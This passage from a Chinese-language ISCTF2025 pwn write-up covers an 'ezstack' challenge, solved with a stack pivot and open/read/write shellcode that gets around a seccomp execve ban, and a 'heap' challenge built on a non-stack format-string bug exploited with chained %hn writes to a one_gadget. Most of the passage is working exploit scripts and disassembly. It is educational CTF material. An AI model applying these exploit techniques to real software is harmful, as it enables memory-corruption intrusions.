[rbp+var_8], rdi</span><br><span class="line">.text:0000000000001155                 mov     [rbp+var_10], rsi</span><br><span class="line">.text:0000000000001159                 mov     [rbp+var_18], rdx</span><br><span class="line">.text:000000000000115D                 mov     [rbp+var_20], rcx</span><br><span class="line">.text:0000000000001161                 mov     [rbp+var_28], r8</span><br><span class="line">.text:0000000000001165                 mov     [rbp+var_30], r9</span><br><span class="line">.text:0000000000001169                 mov     rax, r9</span><br><span class="line">.text:000000000000116C                 mov     r10, rcx</span><br><span class="line">.text:000000000000116F                 mov     r9, r8</span><br><span class="line">.text:0000000000001172                 xor     r9, r9</span><br><span class="line">.text:0000000000001175                 syscall                 ; LINUX -</span><br><span class="line">.text:0000000000001177                 mov     eax, 0</span><br><span class="line">.text:000000000000117C                 pop     rbp</span><br><span class="line">.text:000000000000117D                 retn</span><br><span class="line">.text:000000000000117D ; &#125; // starts at 1149</span><br><span class="line">.text:000000000000117D sub_1149        endp</span><br></pre></td></tr></table></figure>
<p>逆向下来大致的意思是：</p>
<p>在0x114514000开了一个可读可写可执行空间，可以向里面写0x10的数据，有canary保护</p>
<p>然后可以在栈上写栈溢出，0x1000的长度，没有canary保护</p>
<p>当然我们也得到了函数基地址和栈地址</p>
<p>栈溢出的这一块很奇怪，控制不了返回地址，总是call exit</p>
<p>看了看汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000001703                 lea     rax, [rbp+a2]</span><br><span class="line">.text:000000000000170A                 mov     edx, 1000h      ; i</span><br><span class="line">.text:000000000000170F                 mov     rsi, rax        ; a2</span><br><span class="line">.text:0000000000001712                 mov     edi, 0          ; a1</span><br><span class="line">.text:0000000000001717                 call    sub_13B3</span><br><span class="line">.text:000000000000171C                 movzx   eax, byte ptr [rbp+8]</span><br><span class="line">.text:0000000000001720                 movsx   rax, al</span><br><span class="line">.text:0000000000001724                 cmp     [rbp+var_128], rax</span><br><span class="line">.text:000000000000172B                 jz      short loc_1761</span><br><span class="line">.text:000000000000172D                 lea     rax, [rbp+var_120]</span><br><span class="line">.text:0000000000001734                 mov     rdi, rax</span><br><span class="line">.text:0000000000001737                 call    sub_1343</span><br><span class="line">.text:000000000000173C                 mov     r9d, 3Ch ; &#x27;&lt;&#x27;</span><br><span class="line">.text:0000000000001742                 mov     r8d, 0</span><br><span class="line">.text:0000000000001748                 mov     ecx, 0</span><br><span class="line">.text:000000000000174D                 mov     edx, 0</span><br><span class="line">.text:0000000000001752                 mov     esi, 0</span><br><span class="line">.text:0000000000001757                 mov     edi, 0</span><br><span class="line">.text:000000000000175C                 call    sub_1149</span><br><span class="line">.text:0000000000001761</span><br><span class="line">.text:0000000000001761 loc_1761:                               ; CODE XREF: sub_1637+F4↑j</span><br><span class="line">.text:0000000000001761                 xor     rax, rax</span><br><span class="line">.text:0000000000001764                 leave</span><br><span class="line">.text:0000000000001765                 retn</span><br><span class="line">.text:0000000000001765 sub_1637        endp</span><br></pre></td></tr></table></figure>
<p>原来是这一块没有跳转，导致直接将rax=r9d=0x3c，call exit了</p>
<p>关键是这一块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000000171C                 movzx   eax, byte ptr [rbp+8]</span><br><span class="line">.text:0000000000001720                 movsx   rax, al</span><br><span class="line">.text:0000000000001724                 cmp     [rbp+var_128], rax</span><br><span class="line">.text:000000000000172B                 jz      short loc_1761</span><br></pre></td></tr></table></figure>
<p>要使它成立才行，调试的时候发现[rbp+var_128]是0xffffffffffffff9b</p>
<p>关键就出在movsx rax, al，只要我们的[rbp+8]的byte符号拓展与0xffffffffffffff9b相等就行，也就是返回地址的最后一位要是0x9b</p>
<p>很快就找到了对于返回地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000000189B                 xor     rax, rax</span><br><span class="line">.text:000000000000189E                 leave</span><br><span class="line">.text:000000000000189F                 retn</span><br></pre></td></tr></table></figure>
<p>那我们的思路肯定是利用栈迁移在0x114514000写上shellcode并且返回到shellcode上了</p>
<p>返回到main一开始的sub_13B3，向0x114514000里面写，由于我们返回前已经是控制好了的，是一个比较大的读取数，就不用返回到0x1861，直接返回到0x1866，抬高一点地址可以用push就不会写到非法内存里了，后面的就是和前面的一模一样的，控制好栈迁移就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000000184F ; __unwind &#123;</span><br><span class="line">.text:000000000000184F                 endbr64</span><br><span class="line">.text:0000000000001853                 push    rbp</span><br><span class="line">.text:0000000000001854                 mov     rbp, rsp</span><br><span class="line">.text:0000000000001857                 mov     eax, 0</span><br><span class="line">.text:000000000000185C                 call    sub_1429</span><br><span class="line">.text:0000000000001861                 mov     edx, 10h        ; i</span><br><span class="line">.text:0000000000001866                 mov     rax, 114514000h</span><br><span class="line">.text:0000000000001870                 mov     rsi, rax        ; a2</span><br><span class="line">.text:0000000000001873                 mov     edi, 0          ; a1</span><br><span class="line">.text:0000000000001878                 call    sub_13B3</span><br><span class="line">.text:000000000000187D                 mov     eax, 0</span><br><span class="line">.text:0000000000001882                 call    sub_150A</span><br><span class="line">.text:0000000000001887                 mov     eax, 0</span><br><span class="line">.text:000000000000188C                 call    sub_1785</span><br><span class="line">.text:0000000000001891                 mov     eax, 0</span><br><span class="line">.text:0000000000001896                 call    sub_1637</span><br><span class="line">.text:000000000000189B                 xor     rax, rax</span><br><span class="line">.text:000000000000189E                 leave</span><br><span class="line">.text:000000000000189F                 retn</span><br></pre></td></tr></table></figure>
<p>一开始call execve老是不行，结果发现偷偷开了沙箱，无语了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> ~/ISCTF/ezstack  seccomp-tools dump ./pwn                                                                                         </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x01 0x00 0xc000003e  <span class="keyword">if</span> (A == ARCH_X86_64) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0003: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0004: 0x15 0x02 0x00 0x0000003b  <span class="keyword">if</span> (A == execve) goto 0007</span><br><span class="line"> 0005: 0x15 0x01 0x00 0x00000142  <span class="keyword">if</span> (A == execveat) goto 0007</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p=start()</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Welcome to ISCTF2025!\n&quot;</span>)</span><br><span class="line">p.send(p64(<span class="number">0x114514000</span>)+p64(<span class="number">0xffffffffffffff9b</span>))</span><br><span class="line">p.recvuntil(<span class="string">b&quot;DO YOU LIKE GIFT?\n&quot;</span>)</span><br><span class="line">data_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">elf_base=data_addr-<span class="number">0x184f</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">data_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">stack_base=data_addr</span><br><span class="line">log.success(<span class="built_in">hex</span>(elf_base))</span><br><span class="line">log.success(<span class="built_in">hex</span>(stack_base))</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x110</span>+p64(stack_base+<span class="number">0x38</span>)+p64(elf_base+<span class="number">0x189b</span>)+p64(<span class="number">0x114514040</span>)+p64(elf_base+<span class="number">0x1866</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">shellcode=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rdi,0x114514040</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">mov eax,2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdx, 0x200              </span></span><br><span class="line"><span class="string">mov edi,eax</span></span><br><span class="line"><span class="string">mov rsi,0x114514400</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov edi,1 </span></span><br><span class="line"><span class="string">mov rsi,0x114514400</span></span><br><span class="line"><span class="string">mov eax,edi</span></span><br><span class="line"><span class="string">syscall  </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;a&quot;</span>*<span class="number">0x40</span>+<span class="string">b&quot;/flag\x00\x00\x00&quot;</span>+p64(<span class="number">0x114514050</span>)+shellcode.ljust(<span class="number">0xc0</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&quot;a&quot;</span>*<span class="number">0x110</span>+p64(stack_base+<span class="number">0x48</span>)+p64(elf_base+<span class="number">0x189b</span>)+p64(<span class="number">0x114514040</span>)+p64(elf_base+<span class="number">0x189b</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="heap">heap</h3>
<p>看起来是堆题，实际上是考非栈上格式化字符串漏洞</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> ~/ISCTF/heap  checksec ./pwn                                                                                                     </span><br><span class="line">[*] <span class="string">&#x27;/home/ubuntu/ISCTF/heap/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n4; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    print_logo();</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;n4);</span><br><span class="line">    <span class="keyword">if</span> ( n4 == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( n4 &lt;= <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( n4 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          show();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          add();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          delete();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>操作函数如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> nbytes; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> nbytes_4; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  nbytes = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="keyword">for</span> ( nbytes_4 = <span class="number">0</span>; *((_QWORD *)&amp;<span class="built_in">list</span> + nbytes_4); ++nbytes_4 )</span><br><span class="line">    ;</span><br><span class="line">  *((_QWORD *)&amp;<span class="built_in">list</span> + nbytes_4) = <span class="built_in">malloc</span>((<span class="type">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">if</span> ( !*((_QWORD *)&amp;<span class="built_in">list</span> + nbytes_4) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, *((<span class="type">void</span> **)&amp;<span class="built_in">list</span> + nbytes_4), nbytes);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OK!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> num; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  num = read_num();</span><br><span class="line">  <span class="keyword">if</span> ( !*((_QWORD *)&amp;<span class="built_in">list</span> + num) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;<span class="built_in">list</span> + num));</span><br><span class="line">  result = &amp;<span class="built_in">list</span>;</span><br><span class="line">  *((_QWORD *)&amp;<span class="built_in">list</span> + num) = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD v1[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v1);</span><br><span class="line">  <span class="keyword">if</span> ( !*((_QWORD *)&amp;<span class="built_in">list</span> + v1[<span class="number">0</span>]) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(*((<span class="type">const</span> <span class="type">char</span> **)&amp;<span class="built_in">list</span> + v1[<span class="number">0</span>]));</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s_);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很明显，show就是格式化字符串漏洞，由于是写在堆上的，也是非栈上格式化字符串漏洞</p>
<p>而且主函数使用的是exit，不能改主函数返回地址，只能改show函数的返回地址了</p>
<p>“诸葛连弩”需要多次修改，这对于这道题来说实现不了，会出现只修改一次就会出现从show返回时地址错误</p>
<p>所以我们需要另一种方法，就是“四马分肥”</p>
<p>简单来说，“诸葛连弩”是使用一个三连指针攻击四次，“四马分肥”是指使用四个三连指针攻击一次</p>
<p>但是这道题好像没有这么多三联指针，所以只能用“诸葛连弩”创造出多个三联指针了</p>
<p>这个题也是要改rbp达成ogg条件的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size, data=<span class="string">b&#x27;&#x27;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;&gt; &#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">p=start()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>,<span class="string">b&quot;%33$pa%8$p&quot;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]-<span class="number">128</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">p.recvuntil(<span class="string">b&quot;a0x&quot;</span>)</span><br><span class="line">stack_recv=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(stack_recv))</span><br><span class="line"></span><br><span class="line">one_gadget_addr=libc_base+<span class="number">0xebc81</span></span><br><span class="line">one_gadget_1 = one_gadget_addr &amp; <span class="number">0xffff</span></span><br><span class="line">one_gadget_2 = (one_gadget_addr &gt;&gt; <span class="number">16</span>)&amp; <span class="number">0xffff</span></span><br><span class="line">one_gadget_3 = (one_gadget_addr &gt;&gt; <span class="number">32</span>)&amp; <span class="number">0xffff</span></span><br><span class="line">one_gadget_4 = (one_gadget_addr &gt;&gt; <span class="number">48</span>)&amp; <span class="number">0xffff</span></span><br><span class="line">one_gadget_5=(<span class="number">0x10000</span>+one_gadget_2-one_gadget_1)&amp; <span class="number">0xffff</span></span><br><span class="line">one_gadget_6=(<span class="number">0x10000</span>+one_gadget_3-one_gadget_2)&amp; <span class="number">0xffff</span></span><br><span class="line">stack_recv_1=(stack_recv+<span class="number">0x10</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">rbp=(<span class="number">0x10000</span>+stack_recv_1-one_gadget_3)&amp;<span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">stack_addr_1=(stack_recv-<span class="number">0x18</span>)&amp; <span class="number">0xffff</span></span><br><span class="line">stack_addr_2=(stack_recv-<span class="number">0x18</span>+<span class="number">2</span>)&amp; <span class="number">0xffff</span></span><br><span class="line">stack_addr_3=(stack_recv-<span class="number">0x18</span>+<span class="number">4</span>)&amp; <span class="number">0xffff</span></span><br><span class="line">stack_addr_4=(stack_recv-<span class="number">0x18</span>+<span class="number">6</span>)&amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#诸葛连弩创造三联指针</span></span><br><span class="line">stack_addr_new_1=(stack_recv-<span class="number">0x18</span>)&amp; <span class="number">0xffff</span></span><br><span class="line">stack_addr_new_2=((stack_recv-<span class="number">0x18</span>)&gt;&gt;<span class="number">16</span>)&amp; <span class="number">0xffff</span></span><br><span class="line">stack_addr_new_3=((stack_recv-<span class="number">0x18</span>)&gt;&gt;<span class="number">32</span>)&amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">new_addr_1=(stack_recv)&amp; <span class="number">0xffff</span></span><br><span class="line">new_addr_2=(stack_recv+<span class="number">2</span>)&amp; <span class="number">0xffff</span></span><br><span class="line">new_addr_3=(stack_recv+<span class="number">4</span>)&amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">payload_1=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(new_addr_1).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%17$hn&quot;</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x100</span>,payload_1)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">payload_1=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(stack_addr_new_1).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%47$hn&quot;</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x100</span>,payload_1)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">payload_2=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(new_addr_2).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%17$hn&quot;</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x100</span>,payload_2)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">payload_2=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(stack_addr_new_2).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%47$hn&quot;</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x100</span>,payload_2)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">payload_3=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(new_addr_3).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%17$hn&quot;</span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x100</span>,payload_3)</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">payload_3=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(stack_addr_new_3).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%47$hn&quot;</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x100</span>,payload_3)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">stack_addr_new_1=(stack_recv-<span class="number">0x18</span>+<span class="number">4</span>)&amp; <span class="number">0xffff</span></span><br><span class="line">stack_addr_new_2=((stack_recv-<span class="number">0x18</span>+<span class="number">4</span>)&gt;&gt;<span class="number">16</span>)&amp; <span class="number">0xffff</span></span><br><span class="line">stack_addr_new_3=((stack_recv-<span class="number">0x18</span>+<span class="number">4</span>)&gt;&gt;<span class="number">32</span>)&amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">new_addr_1=(stack_recv+<span class="number">0x110</span>)&amp; <span class="number">0xffff</span></span><br><span class="line">new_addr_2=(stack_recv+<span class="number">2</span>+<span class="number">0x110</span>)&amp; <span class="number">0xffff</span></span><br><span class="line">new_addr_3=(stack_recv+<span class="number">4</span>+<span class="number">0x110</span>)&amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">payload_1=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(new_addr_1).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%17$hn&quot;</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x100</span>,payload_1)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">payload_1=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(stack_addr_new_1).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%47$hn&quot;</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x100</span>,payload_1)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">payload_2=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(new_addr_2).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%17$hn&quot;</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x100</span>,payload_2)</span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">payload_2=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(stack_addr_new_2).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%47$hn&quot;</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x100</span>,payload_2)</span><br><span class="line">show(<span class="number">10</span>)</span><br><span class="line">payload_3=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(new_addr_3).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%17$hn&quot;</span></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x100</span>,payload_3)</span><br><span class="line">show(<span class="number">11</span>)</span><br><span class="line">payload_3=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(stack_addr_new_3).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%47$hn&quot;</span></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x100</span>,payload_3)</span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">stack_addr_new_1=(stack_recv-<span class="number">0x20</span>)&amp; <span class="number">0xffff</span></span><br><span class="line">stack_addr_new_2=((stack_recv-<span class="number">0x20</span>)&gt;&gt;<span class="number">16</span>)&amp; <span class="number">0xffff</span></span><br><span class="line">stack_addr_new_3=((stack_recv-<span class="number">0x20</span>)&gt;&gt;<span class="number">32</span>)&amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">new_addr_1=(stack_recv+<span class="number">0x100</span>)&amp; <span class="number">0xffff</span></span><br><span class="line">new_addr_2=(stack_recv+<span class="number">2</span>+<span class="number">0x100</span>)&amp; <span class="number">0xffff</span></span><br><span class="line">new_addr_3=(stack_recv+<span class="number">4</span>+<span class="number">0x100</span>)&amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">payload_1=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(new_addr_1).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%17$hn&quot;</span></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x100</span>,payload_1)</span><br><span class="line">show(<span class="number">13</span>)</span><br><span class="line">payload_1=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(stack_addr_new_1).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%47$hn&quot;</span></span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x100</span>,payload_1)</span><br><span class="line">show(<span class="number">14</span>)</span><br><span class="line">payload_2=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(new_addr_2).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%17$hn&quot;</span></span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x100</span>,payload_2)</span><br><span class="line">show(<span class="number">15</span>)</span><br><span class="line">payload_2=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(stack_addr_new_2).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%47$hn&quot;</span></span><br><span class="line">add(<span class="number">16</span>,<span class="number">0x100</span>,payload_2)</span><br><span class="line">show(<span class="number">16</span>)</span><br><span class="line">payload_3=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(new_addr_3).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%17$hn&quot;</span></span><br><span class="line">add(<span class="number">17</span>,<span class="number">0x100</span>,payload_3)</span><br><span class="line">show(<span class="number">17</span>)</span><br><span class="line">payload_3=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(stack_addr_new_3).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%47$hn&quot;</span></span><br><span class="line">add(<span class="number">18</span>,<span class="number">0x100</span>,payload_3)</span><br><span class="line">show(<span class="number">18</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 四马分肥</span></span><br><span class="line">payload1=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(stack_addr_2).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%20$hn&quot;</span></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&quot;%&quot;</span> + <span 